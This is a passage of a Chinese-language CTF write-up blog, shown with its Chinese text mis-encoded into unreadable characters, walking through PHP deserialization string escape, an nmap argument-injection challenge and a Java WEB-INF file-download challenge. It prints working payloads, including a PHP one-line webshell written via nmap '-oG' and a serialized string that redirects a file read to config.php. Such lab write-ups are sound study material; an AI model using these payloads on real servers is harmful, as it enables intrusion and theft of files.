<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$user-&gt;update_profile($username, serialize($profile)); <span class="comment">// å¿…å®šå­˜åœ¨ä¸€ä¸ªåºåˆ—åŒ–æ“ä½œ</span></span><br></pre></td></tr></table></figure>

<p>åœ¨profile.php ä¸­: å­˜åœ¨<code>æ–‡ä»¶æ“ä½œå‡½æ•°</code>ä»¥åŠ<code>å¯æ§</code>çš„å‚æ•° <code>photo</code> ,å¦‚æœ<code> photo</code> ä¸ºconfig.php å°±èƒ½è¯»å–åˆ°flag, photo è¾“å‡ºæ˜¯ä»¥base64çš„å½¢å¼</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$photo = base64_encode(file_get_contents($profile[<span class="string">&#x27;photo&#x27;</span>])); <span class="comment">// å¦‚æœphoto ä¸º config.php å°±å¯ä»¥è¯»å–flag</span></span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200223152029.png" alt="profile.php"></p>
<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200223152709.png" alt="update.php"></p>
<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200223153148.png" alt="class.php"></p>
<p>è¿™é‡Œçš„æ­£åˆ™è¿‡æ»¤æ‰äº†<code>where</code>(5) ,å¦‚æœå­˜åœ¨whereç­‰å­—æ®µ,å°±ç”¨<code>hacker</code>(6) æ¥æ›¿æ¢</p>
<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200223153711.png"></p>
<p>åœ¨update.php ä¸­å¯¹æ•°ç»„profile è¿›è¡Œåºåˆ—åŒ–å‚¨å­˜å,åœ¨profile.php è¿›è¡Œååºåˆ—åŒ–,ç„¶åè¿™é“é¢˜çš„è€ƒç‚¹å°±åœ¨è¿™ä¸¤æ­¥æ“ä½œä¸­çš„ä¸€ä¸ªå¾ˆç»†èŠ‚çš„ç‚¹</p>
<p>åœ¨ååºåˆ—åŒ–<code>unserialize()</code> æ—¶,ä¼šè‡ªåŠ¨å¿½ç•¥æ‰èƒ½å¤Ÿæ­£ç¡®åºåˆ—åŒ–ä¹‹åçš„å†…å®¹( ä¹Ÿå°±æ˜¯<strong>æ„é€ é—­åˆ</strong> ),ä»è€Œå¿½ç•¥æ‰<code>upload/md5(filename)</code></p>
<p>é€šè¿‡æŠ“åŒ…æ¥çœ‹ä¸€ä¸‹æ•°ç»„çš„ä¸­å…ƒç´ çš„ä¼ é€’çš„é¡ºåº,ä¹Ÿæ˜¯ nickname æ˜¯ä½äºphotoä¹‹å‰çš„,æ‰€ä»¥å¯ä»¥æƒ³åŠæ³•è®©nicknameè¶³å¤Ÿé•¿,æŠŠuploadé‚£éƒ¨åˆ†å­—æ®µç»™â€æŒ¤å‡ºå»â€  ä¸“ä¸šæœ¯è¯­: <strong>ååºåˆ—åŒ–é•¿åº¦å˜åŒ–å°¾éƒ¨å­—ç¬¦ä¸²é€ƒé€¸</strong></p>
<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200223160846.png"></p>
<p>å†æ¥ç†æ¸…ä¸€ä¸‹æ€è·¯: </p>
<ul>
<li>è¦ä½¿ photo å­—æ®µçš„å†…å®¹ä¸º config.php,æ„é€ é—­åˆå¦‚ä¸‹</li>
</ul>
<p><code>&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</code> è¿™é‡Œä¸€å…± 34 ä¸ªå­—ç¬¦.  é‚£ä¹ˆåœ¨åŸæ¥çš„ nicknameä¸­çš„<code>where....where...</code> ä¸€å…±æ˜¯170ä¸ªå­—ç¬¦,åŠ ä¸Š <code>&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</code> åä¸º204ä¸ªå­—ç¬¦,ç›¸å·®34 ä¸ªå­—ç¬¦, å› ä¸ºæ­£åˆ™åŒ¹é…æŠŠwhere æ›¿æ¢ä¸º hacker ,æ¯æ›¿æ¢ä¸€ä¸ªå°±å¢åŠ  1ä¸ªå­—ç¬¦,ç°åœ¨ç”¨34ä¸ªwhereå°±å¯ä»¥å¢åŠ 34ä¸ªå­—ç¬¦,å¯¼è‡´æ„é€ çš„<code>&quot;;&#125;s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</code> çš„æ•ˆæœä¸º <code>&quot;;&#125;</code> æ˜¯ä¸ºäº†é—­åˆnicknameéƒ¨åˆ†.</p>
<p> <code>s:5:&quot;photo&quot;;s:10:&quot;config.php&quot;;&#125;</code> è€Œåé¢è¿™éƒ¨åˆ†,å°±å•ç‹¬æˆä¸ºäº† photo çš„éƒ¨åˆ†( <strong>å°¾éƒ¨å­—ç¬¦ä¸²é€ƒé€¸</strong> ),åˆ°è¾¾æ•ˆæœ</p>
<ul>
<li>ç»•è¿‡æ­£åˆ™è¡¨è¾¾å¼å’Œé•¿åº¦é™åˆ¶</li>
</ul>
<p>ä½¿ç”¨æ•°ç»„ç»•è¿‡ nickname[]=</p>
<p>payload: </p>
<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200223161427.png" alt="æ„é€ æ•°ç»„ç»•è¿‡strlen()å’Œæ­£åˆ™è¡¨è¾¾å¼"></p>
<p>å‘åŒ…ååœ¨<code>/profile.php</code> é¡µé¢å¤åˆ¶å¤´åƒçš„åœ°å€,è¿›è¡Œbase64decodeå¾—åˆ°flag</p>
<p>æ¥å‚è€ƒä¸€ä¸‹ä¸€ä½å¸ˆå‚…çš„åˆ†ææ–‡ç« ä¸­çš„å›¾ç‰‡(å‚è€ƒèµ„æ–™2) , ä¼šæ›´å®¹æ˜“ç†è§£</p>
<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200223165804.png"></p>
<p>å‚è€ƒèµ„æ–™: </p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/zz_Caleb/article/details/96777110">https://blog.csdn.net/zz_Caleb/article/details/96777110</a></p>
<p><a target="_blank" rel="noopener" href="https://www.bbsmax.com/A/QV5ZV3Vb5y/">https://www.bbsmax.com/A/QV5ZV3Vb5y/</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/20175211lyz/p/11444134.html">https://www.cnblogs.com/20175211lyz/p/11444134.html</a></p>
<h1 id="BUUCTF-2018-Online-Tool"><a href="#BUUCTF-2018-Online-Tool" class="headerlink" title="[BUUCTF 2018]Online Tool"></a>[BUUCTF 2018]Online Tool</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_SERVER[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>])) &#123; <span class="comment">// è®¾ç½®XFF å¤´,è·å–çœŸå®IP</span></span><br><span class="line">    $_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] = $_SERVER[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>]; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">&#x27;host&#x27;</span>])) &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $host = $_GET[<span class="string">&#x27;host&#x27;</span>];</span><br><span class="line">    $host = escapeshellarg($host); <span class="comment">// å¯¹å‚æ•°hostå¢åŠ ä¸€ä¸ªå•å¼•å·&#x27;</span></span><br><span class="line">    $host = escapeshellcmd($host); <span class="comment">// å¯¹å‚æ•°hostä¸­å¯èƒ½å­˜åœ¨çš„å±é™©ç¬¦å·è¿›è¡Œè½¬ä¹‰</span></span><br><span class="line">    $sandbox = md5(<span class="string">&quot;glzjin&quot;</span>. $_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]); <span class="comment">// å¯¹ glzjinå’ŒIP è¿›è¡Œmd5</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;you are in sandbox &#x27;</span>.$sandbox;</span><br><span class="line">    @mkdir($sandbox); <span class="comment">// åˆ›å»ºä¸€ä¸ªç›®å½•</span></span><br><span class="line">    chdir($sandbox); <span class="comment">// åˆ‡æ¢å½“å‰ç›®å½•</span></span><br><span class="line">    <span class="keyword">echo</span> system(<span class="string">&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;</span>.$host);</span><br><span class="line">    <span class="comment">// è¿™é‡Œä½¿ç”¨äº†ç³»ç»Ÿå‡½æ•°system()ï¼Œå¹¶ä¸”å­˜åœ¨å¯æ§çš„å‚æ•°$host é‚£ä¹ˆå¾ˆæ˜æ˜¾åˆ©ç”¨ç‚¹å°±æ˜¯è¿™</span></span><br><span class="line">    <span class="comment">// å°±æ˜¯æƒ³åŠæ³•ä½¿hostä¸­å­˜åœ¨å¯ä»¥æ‰§è¡Œçš„shell å‘½ä»¤,å¦‚ls ç„¶åå†cat /flagä¹‹ç±»</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>æœ‰ä¸¤ä¸ªå‡½æ•°ä»¥å‰æ²¡é‡åˆ°è¿‡ï¼Œå­¦ä¹ ä¸€ä¸‹ğŸ˜€</p>
<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200223205845.png"></p>
<p>escapeshellarg å‡½æ•°å°±æ˜¯å­—ç¬¦ä¸²å¢åŠ ä¸€ä¸ªå•å¼•å·æˆ–è€…å¼•ç”¨å·²ç»è½¬ç å­˜åœ¨è¿‡çš„å•å¼•å·, å°±æ˜¯å¯ä»¥æŠŠè¾“å…¥çš„å‚æ•°ç”¨å•å¼•å·ç»™æ‹¬èµ·æ¥(å°†ä¼ å…¥çš„å­—ç¬¦ä¸²è§£æä¸ºLinux å¯ä»¥æ‰§è¡Œçš„è¯­å¥),è¿™æ ·ç„¶å <code> &#39;127.0.0.1|ls&#39;</code> çš„è¯, å•å¼•å·å°±æˆåŠŸé€ƒé€¸äº†æˆä¸º <code>&#39;&#39;127.0.0.1|ls&#39;&#39;</code> </p>
<p>ä½†æ˜¯æ²¡æœ‰ç»“æœ, å†å›è¿‡å¤´æ¥å‘ç°,åŸå› æ˜¯è¿™ä¸ªsystem() å‡½æ•°å·²ç»å†™æ­»äº†</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> system(<span class="string">&quot;nmap -T5 -sT -Pn --host-timeout 2 -F &quot;</span>.$host);</span><br><span class="line"><span class="comment">// åªèƒ½é€šè¿‡namp çš„æŸäº›æ“ä½œæ¥è¯»å–flag</span></span><br></pre></td></tr></table></figure>



<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200223205752.png"></p>
<blockquote>
<p>escapeshellcmd å‡½æ•°å°±æ˜¯ç»™ä¸€äº›å±é™©çš„å­—ç¬¦å‰æ·»åŠ åæ–œçº¿\æ¥è¿›è¡Œè½¬ä¹‰</p>
</blockquote>
<p>åœ¨æœç´¢è¿™ä¸¤ä¸ªå‡½æ•°çš„åŒæ—¶ï¼Œå‘ç°äº†å¦‚æœè¿™ä¸¤ä¸ªå‡½æ•°åœ¨ä¸€èµ·ä½¿ç”¨ï¼Œå¦‚æœæ²¡æœ‰å¤„ç†çš„è¯ï¼Œå°±ä¼šå¯¼è‡´<strong>å‚æ•°æ³¨å…¥</strong></p>
<p>ä»å‚è€ƒèµ„æ–™3 ä¸­ï¼Œè¿™ä¸¤ä¸ªå‡½æ•°ä½¿ç”¨åï¼Œå› ä¸º â€˜ ( escapeshellarg ä¸ºå‚æ•°å¢åŠ å•å¼•å· )å’Œ \ (escapeshellcmd è¿›è¡Œè½¬ä¹‰)çš„åŸå› ï¼Œæœ€åå¤„ç†å°±æˆäº†ä¸¤ä¸ªå‚æ•°ï¼Œ<code>\\</code> ä¹Ÿå°±åªæ˜¯å»åŒ¹é…\äº†</p>
<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200223221730.png" alt="åå¤ç†è§£,åŠ æ·±å°è±¡"></p>
<p>ç°åœ¨æ¥æœ¬åœ°æµ‹ä¸€ä¸‹è¿™ä¸¤ä¸ªå‡½æ•°: </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $a = <span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">    <span class="comment">//var_dump(escapeshellarg($a));</span></span><br><span class="line">    <span class="comment">//echo escapeshellarg($a);</span></span><br><span class="line">    var_dump(escapeshellcmd($a));</span><br><span class="line">    <span class="keyword">echo</span> escapeshellcmd($a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    <span class="comment">// è¾“å‡ºç»“æœä¸º: string(2) &quot;\&#x27;&quot; å’Œ \&#x27; ,è¯´æ˜ escapeshellcmd,æ˜¯åœ¨å¯¹ä¸é…å¯¹çš„&#x27;è¿›è¡Œè½¬ä¹‰</span></span><br><span class="line">    <span class="comment">// å¦ä¸€ä¸ªå‡½æ•°çš„è¾“å‡ºç»“æœä¸º: string(6) &quot;&#x27;&#x27;\&#x27;&#x27;&#x27;&quot; å’Œ &#x27;&#x27;\&#x27;&#x27;&#x27;,è¯´æ˜escapeshellargæ˜¯åœ¨ä¿ç•™åŸæ¥çš„\&#x27;å•å¼•å·çš„åŒæ—¶(é€šè¿‡è½¬ä¹‰),å†å¼•ç”¨å•å¼•å·å°†å·¦å³ä¸¤éƒ¨æ‹¬èµ·æ¥ä»è€Œèµ·åˆ°è¿æ¥çš„ä½œç”¨</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>ç„¶åä¸ºä»€ä¹ˆä¸ºåšä¸å‡ºæ¥çš„åŸå› å‘¢,å› ä¸ºescapeshellcmd å¯¹ shellä¸­çš„å‘½ä»¤æ‰§è¡Œçš„æ“ä½œç¬¦éƒ½è¿›è¡Œäº†è½¬ä¹‰,å¯¼è‡´æ— æ³•è¿›è¡Œåˆ©ç”¨, é‚£ä¹ˆç›´æ¥æ— æ³•åˆ©ç”¨, é‚£å¯ä¸å¯ä»¥å†™ä¸€ä¸ªwebshell ç„¶åæ‰¾è™šæ‹Ÿç»ˆç«¯ä¸­æ‰§è¡Œå§.æ‰€ä»¥ç°åœ¨çš„æ€è·¯å°±æ­»å¦‚ä½•å†™å…¥webshell( åˆ©ç”¨ä¸Šé¢çš„system()å‡½æ•°å’Œnmap ) æœç„¶,nmap æ˜¯æ”¯æŒè¾“å‡ºçš„</p>
<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200223222553.png"></p>
<p>payload: </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;?host&#x3D;&#39;&lt;?php @eval($_POST[&quot;aaa&quot;]);?&gt; -oG shell.php &#39;</span><br><span class="line"># è¿™é‡Œæœ‰ä¸€ç‚¹,å¦‚æœä¹ æƒ¯æŠŠä¸€å¥è¯å¯†ç ç”¨å•å¼•å·&#39;aaa&#39; è¿™é‡Œå°±ä¸è¡Œ,å› ä¸ºè¿™é‡Œçš„æ‰€æœ‰å†…å®¹éƒ½ä½œä¸ºå‚æ•°hostçš„å†…å®¹,å› æ­¤åªè¦é‡è§äº†å•å¼•å·å°±å˜æˆ&#39;&#39;aaa&#39;&#39;</span><br></pre></td></tr></table></figure>

<p>å‚è€ƒèµ„æ–™ï¼š </p>
<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/escapeshellarg-and-parameter-injection.html">https://www.leavesongs.com/PENETRATION/escapeshellarg-and-parameter-injection.html</a></p>
<p><a target="_blank" rel="noopener" href="http://www.lmxspace.com/2018/07/16/%E8%B0%88%E8%B0%88escapeshellarg%E5%8F%82%E6%95%B0%E7%BB%95%E8%BF%87%E5%92%8C%E6%B3%A8%E5%85%A5%E7%9A%84%E9%97%AE%E9%A2%98/">è°ˆè°ˆescapeshellargå‚æ•°ç»•è¿‡å’Œæ³¨å…¥çš„é—®é¢˜</a></p>
<p><a target="_blank" rel="noopener" href="https://paper.seebug.org/164/">https://paper.seebug.org/164/</a></p>
<p><a target="_blank" rel="noopener" href="https://nmap.org/man/zh/man-output.html">https://nmap.org/man/zh/man-output.html</a></p>
<p>[5](<a target="_blank" rel="noopener" href="https://note.redmango.top/Online">https://note.redmango.top/Online</a> Tool(BUUCTF 2018)/)</p>
<h1 id="RoarCTF-2019-Easy-Java"><a href="#RoarCTF-2019-Easy-Java" class="headerlink" title="[RoarCTF 2019]Easy Java"></a>[RoarCTF 2019]Easy Java</h1><blockquote>
<p><strong>ä»»æ„æ–‡ä»¶ä¸‹è½½, WEB-INF/web.xml æºç æ³„éœ²</strong></p>
</blockquote>
<p>æ‰“å¼€é¢˜ç›®æ˜¯ä¸€ä¸ªç™»é™†ç•Œé¢,å¹¶æ²¡æœ‰æ³¨å†Œä¹‹ç±»,å¹¶ä¸”é€šè¿‡é¢˜ç›®ä¹ŸçŸ¥é“ä¸å¯èƒ½æ˜¯SQLæ³¨å…¥,ç‚¹å‡»help meå</p>
<p>è·³è½¬åçš„URL ä¸º : <code>/Download?filename=help.docx</code></p>
<p>æ—¢ç„¶æ²¡æœ‰å…¶ä»–åŠŸèƒ½,ä»URLä¸­å¯ä»¥çœ‹åˆ°æ˜¯ä¸‹è½½æ–‡ä»¶,å¾—flagåº”è¯¥å°±æ˜¯æŠŠå«æœ‰flagçš„æ–‡ä»¶ä¸‹è½½ä¸‹æ¥</p>
<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200224143000.png"></p>
<p>ä¸ºä»€ä¹ˆæ˜¯ <code>WEB-INF/</code> æ³„éœ²å‘¢?</p>
<p>å› ä¸ºä»é¢˜ç›®çŸ¥é“æ˜¯å…³äº java web çš„é¢˜ç›®, tomcat æ˜¯ç”¨java webå†™çš„, Tomcatçš„é…ç½®ç›®å½•ä¸­å­˜åœ¨ä¸€ä¸ª<code>WEB-INF\XXX</code> XXXå°±æ˜¯ä¸‹é¢è¿™äº›ä¸œè¥¿,å…¶ä¸­ <code>web.xml</code> å°±æ˜¯webåº”ç”¨ç¨‹åºé…ç½®æ–‡ä»¶, é‚£ä¹ˆæ—¢ç„¶æ˜¯ä»»æ„æ–‡ä»¶ä¸‹è½½,é‚£è‚¯å®šå…ˆæŠŠé…ç½®æ–‡ä»¶ä¸‹è½½ä¸‹æ¥å•Š</p>
<blockquote>
<p>WEB-INFä¸»è¦åŒ…å«ä¸€ä¸‹æ–‡ä»¶æˆ–ç›®å½•ï¼š<br>   /WEB-INF/web.xmlï¼šWebåº”ç”¨ç¨‹åºé…ç½®æ–‡ä»¶ï¼Œæè¿°äº† servlet å’Œå…¶ä»–çš„åº”ç”¨ç»„ä»¶é…ç½®åŠå‘½åè§„åˆ™ã€‚<br>   /WEB-INF/classes/ï¼šå«äº†ç«™ç‚¹æ‰€æœ‰ç”¨çš„ class æ–‡ä»¶ï¼ŒåŒ…æ‹¬ servlet class å’Œéservlet classï¼Œä»–ä»¬ä¸èƒ½åŒ…å«åœ¨ .jaræ–‡ä»¶ä¸­<br>   /WEB-INF/lib/ï¼šå­˜æ”¾webåº”ç”¨éœ€è¦çš„å„ç§JARæ–‡ä»¶ï¼Œæ”¾ç½®ä»…åœ¨è¿™ä¸ªåº”ç”¨ä¸­è¦æ±‚ä½¿ç”¨çš„jaræ–‡ä»¶,å¦‚æ•°æ®åº“é©±åŠ¨jaræ–‡ä»¶<br>   /WEB-INF/src/ï¼šæºç ç›®å½•ï¼ŒæŒ‰ç…§åŒ…åç»“æ„æ”¾ç½®å„ä¸ªjavaæ–‡ä»¶ã€‚<br>   /WEB-INF/database.propertiesï¼šæ•°æ®åº“é…ç½®æ–‡ä»¶<br> æ¼æ´æ£€æµ‹ä»¥åŠåˆ©ç”¨æ–¹æ³•ï¼šé€šè¿‡æ‰¾åˆ°web.xmlæ–‡ä»¶ï¼Œæ¨æ–­classæ–‡ä»¶çš„è·¯å¾„ï¼Œæœ€åç›´æ¥classæ–‡ä»¶ï¼Œåœ¨é€šè¿‡åç¼–è¯‘classæ–‡ä»¶ï¼Œå¾—åˆ°ç½‘ç«™æºç </p>
</blockquote>
<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200224172350.png"></p>
<p> ä»€ä¹ˆæ˜¯ servlet ?</p>
<blockquote>
<p>Servletï¼ˆServer Appletï¼‰æ˜¯<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/Java/85979">Java</a> Servletçš„ç®€ç§°ï¼Œç§°ä¸ºå°æœåŠ¡ç¨‹åºæˆ–æœåŠ¡è¿æ¥å™¨ï¼Œç”¨Javaç¼–å†™çš„<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E6%9C%8D%E5%8A%A1%E5%99%A8/100571">æœåŠ¡å™¨</a>ç«¯ç¨‹åºï¼Œå…·æœ‰ç‹¬ç«‹äºå¹³å°å’Œ<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/%E5%8D%8F%E8%AE%AE/13020269">åè®®</a>çš„ç‰¹æ€§ï¼Œä¸»è¦åŠŸèƒ½åœ¨äºäº¤äº’å¼åœ°æµè§ˆå’Œç”Ÿæˆæ•°æ®ï¼Œç”ŸæˆåŠ¨æ€<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/Web/150564">Web</a>å†…å®¹ã€‚</p>
<p>ç‹­ä¹‰çš„Servletæ˜¯æŒ‡Javaè¯­è¨€å®ç°çš„ä¸€ä¸ªæ¥å£ï¼Œå¹¿ä¹‰çš„Servletæ˜¯æŒ‡ä»»ä½•å®ç°äº†è¿™ä¸ªServletæ¥å£çš„ç±»ï¼Œä¸€èˆ¬æƒ…å†µä¸‹ï¼Œäººä»¬å°†Servletç†è§£ä¸ºåè€…ã€‚Servletè¿è¡Œäºæ”¯æŒJavaçš„åº”ç”¨æœåŠ¡å™¨ä¸­ã€‚ä»åŸç†ä¸Šè®²ï¼ŒServletå¯ä»¥å“åº”ä»»ä½•ç±»å‹çš„è¯·æ±‚ï¼Œä½†<strong>ç»å¤§å¤šæ•°æƒ…å†µä¸‹Servletåªç”¨æ¥æ‰©å±•åŸºäºHTTPåè®®çš„WebæœåŠ¡å™¨ã€‚</strong></p>
<p>æœ€æ—©æ”¯æŒServletæ ‡å‡†çš„æ˜¯JavaSoftçš„Java [Web Server](<a target="_blank" rel="noopener" href="https://baike.baidu.com/item/Web">https://baike.baidu.com/item/Web</a> Server/9306055)ï¼Œæ­¤åï¼Œä¸€äº›å…¶å®ƒçš„åŸºäºJavaçš„WebæœåŠ¡å™¨å¼€å§‹æ”¯æŒæ ‡å‡†çš„Servletã€‚</p>
<p>â€”- ç™¾åº¦ç™¾ç§‘</p>
</blockquote>
<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200224145330.png"></p>
<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200224151402.png"></p>
<p>å› ä¸ºè¿™ä¸ªflagå­—æ®µè‚¯å®šåœ¨é‡Œé¢,æ‰€ä»¥å¯¹æ‰€æœ‰å†…å®¹base64decode è‚¯å®šå°±èƒ½å‡ºflag</p>
<p>è¿™é‡Œç”¨hackerbar POST é€ <code>/WEB-INF/classes/com/wm/ctf/FlagController.class</code> å³å¯ä¸‹è½½ <code>.class</code> æ–‡ä»¶ , æˆ‘ç”¨ä¸“é—¨çš„Java åç¼–è¯‘è½¯ä»¶æ²¡ååº”,ç”¨IDA çœ‹äº†ä¸‹,æ‰¾åˆ°äº†é‚£æ®µbase64çš„ä»£ç </p>
<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200224152714.png"></p>
<p>è¡¥å……: </p>
<p>åœ¨é—®äº†è½¯å·¥æJAVA çš„åŒå­¦å, åº”è¯¥æ˜¯æˆ‘çš„JAVA JDK æ²¡æœ‰æ·»åŠ åˆ°ç¯å¢ƒå˜é‡,æ‰€æœ‰æ²¡æœ‰ååº”,æäº†ç¯å¢ƒå˜é‡åå°±å¯ä»¥åç¼–è¯‘äº†</p>
<p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo/images/20200224161434.png"></p>
<p>å‚è€ƒèµ„æ–™: </p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/durendong/article/details/54578519">https://blog.csdn.net/durendong/article/details/54578519</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/jdjdndhj/article/details/52694202">https://blog.csdn.net/jdjdndhj/article/details/52694202</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/lindiwo/article/details/80818345">https://blog.csdn.net/lindiwo/article/details/80818345</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/20175211lyz/p/11691839.html#web-infweb.xml%E6%B3%84%E9%9C%B2">https://www.cnblogs.com/20175211lyz/p/11691839.html#web-infweb.xml%E6%B3%84%E9%9C%B2</a></p>
<h1 id="SUCTF-2019-Pythonginx"><a href="#SUCTF-2019-Pythonginx" class="headerlink" title="[SUCTF 2019]Pythonginx"></a>[SUCTF 2019]Pythonginx</h1><p>å‡ºé¢˜æ¥æº: <a target="_blank" rel="noopener" href="https://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf">https://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf</a></p>
<blockquote>
<p><strong>CVE-2019-9636ï¼šurlsplitä¸å¤„ç†NFKCæ ‡å‡†åŒ–</strong></p>
</blockquote>
<h2 id="IDNA"><a href="#IDNA" class="headerlink" title="IDNA"></a>IDNA</h2><p>ï¼ˆInternationalizing Domain Names in Applicationsï¼‰åº”ç”¨ç¨‹åºå›½é™…åŒ–åŸŸå</p>
<ul>
<li>â€‹       IDNAæ˜¯ä¸€ç§ä»¥æ ‡å‡†æ–¹å¼å¤„ç†ASCIIä»¥å¤–å­—ç¬¦çš„ä¸€ç§æœºåˆ¶ï¼Œå®ƒä»unicodeä¸­æå–å­—ç¬¦ï¼Œå¹¶å…è®¸éASCIIç å­—ç¬¦ä»¥å…è®¸ä½¿ç”¨çš„ASCIIå­—ç¬¦è¡¨ç¤ºã€‚</li>
<li>â€‹       å›½é™…åŒ–åŸŸå(IDN)æœ€åˆæ˜¯ç”±é©¬ä¸Â·æœæ–¯ç‰¹äº1996å¹´12æœˆæå‡ºã€‚1998å¹´åœ¨æ–°åŠ å¡å›½ç«‹å¤§å­¦æ•™æˆé™ˆå®šç‚œçš„æŒ‡å¯¼ä¸‹ï¼ŒTan  Juay Kwangå’ŒLeong Kok  Yongå°†å…¶ä»˜è¯¸å®æ–½ã€‚ç»è¿‡è®¸å¤šè®¨è®ºå’Œå¯¹æ¯”å„ç§ææ¡ˆåï¼Œåº”ç”¨ç¨‹åºå›½é™…åŒ–åŸŸåï¼ˆIDNA)è¢«é‡‡çº³ä¸ºæ­£å¼æ ‡å‡†ï¼Œå¹¶è¢«ç”¨åœ¨è®¸å¤šé¡¶çº§åŸŸåä¸­ã€‚åœ¨IDNAä¸­ï¼Œâ€œå›½é™…åŒ–åŸŸåâ€ç‰¹æŒ‡å¯ä»¥æˆåŠŸå°†IDNAè½¬åŒ–ä¸ºåè¿›ä½åˆ¶ASCIIçš„åŸŸåã€‚</li>
</ul>
<p>å­˜åœ¨æ¼æ´çš„ IDNA ç‰ˆæœ¬: </p>
<p><strong>IDNA2008</strong>é˜»æ–­äº†åˆ†å‰²åŸŸåçš„å­—ç¬¦</p>
<p><strong>IDNA2003</strong> å’Œ <strong>IDNA2008 + UTS46</strong>å­˜åœ¨æ¼æ´</p>
